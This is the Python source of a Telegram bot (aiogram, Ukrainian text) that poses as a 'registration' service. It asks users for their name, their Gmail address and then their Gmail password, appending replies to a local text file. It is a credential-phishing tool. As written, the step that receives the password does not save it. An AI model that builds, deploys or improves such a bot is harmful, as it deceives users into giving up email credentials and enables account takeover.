import logging

from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from steps import Flow
from keyboards import request_contact, request1
from config import TOKEN

logging.basicConfig(level=logging.INFO)

bot = Bot(token=TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())


@dp.message_handler(commands='start')
async def start(message: types.Message):
    await message.answer('Привіт! Я бот для реєстрації.\n\nДля того, щоб увесь процес пройшов успішно, роби прохання що я буду писати.', reply_markup=request1)


@dp.message_handler(text ='Добре! Давайте розпочнемо')
async def name(message: types.Message):
        await Flow.Name.set()
        await message.answer("Для початку, напишіть своє ім'я")
        file = open('registration.txt', 'w')
        file.write(f'{message.text}\n')
@dp.message_handler(text ='Чому')
async def name(message: types.Message):
     await message.answer('Якщо ви не будете дотримуватися умов завдання, ми не зможемо почати реєстрацію.')

@dp.message_handler(content_types='text' , state=Flow.Name) 
async def Email(message: types.Message):
    await Flow.Email.set()
    await message.answer('Поширте свою Gmail пошту')
    file = open('registration.txt', 'a')
    file.write(f'{message.text}\n')
    
@dp.message_handler(content_types='text' , state=Flow.Email) 
async def password(message: types.Message):
    await Flow.Password.set()
    await message.answer('Поширте свій пароль від пошти\n(якщо забули, ми не здивовані)')
    file = open('registration.txt', 'a')
    file.write(f'{message.text}\n')
    
@dp.message_handler(content_types='text' , state=Flow.Password) 
async def repeat(message: types.Message):
    await Flow.End.set()
    await message.answer('Реєстрація пройшла успішно, дякуємо!')
    
@dp.message_handler(commands='start', state=Flow.End)
async def start(message: types.Message):
    await message.answer('Наразі, ви вже зареєструвались')

if __name__=='__main__':
    executor.start_polling(dp)
    
    
